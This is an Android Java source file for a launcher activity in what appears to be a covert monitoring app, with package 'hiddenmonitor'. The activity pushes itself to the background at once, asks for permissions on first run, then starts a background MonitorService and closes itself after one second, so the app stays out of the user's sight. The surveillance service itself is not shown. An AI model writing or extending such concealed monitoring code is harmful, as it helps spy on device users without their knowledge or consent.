package com.example.hiddenmonitor;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import androidx.appcompat.app.AppCompatActivity;

public class HiddenLauncher extends AppCompatActivity {
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Immediately move to background
        moveTaskToBack(true);
        
        // Check if first run
        SharedPreferences prefs = getSharedPreferences("config", MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean("first_run", true);
        
        if (isFirstRun) {
            // Show permission activity
            Intent intent = new Intent(this, PermissionActivity.class);
            startActivity(intent);
        } else {
            // Start monitoring service
            startMonitoring();
        }
        
        // Finish after 1 second
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                finish();
            }
        }, 1000);
    }
    
    private void startMonitoring() {
        Intent serviceIntent = new Intent(this, MonitorService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
}
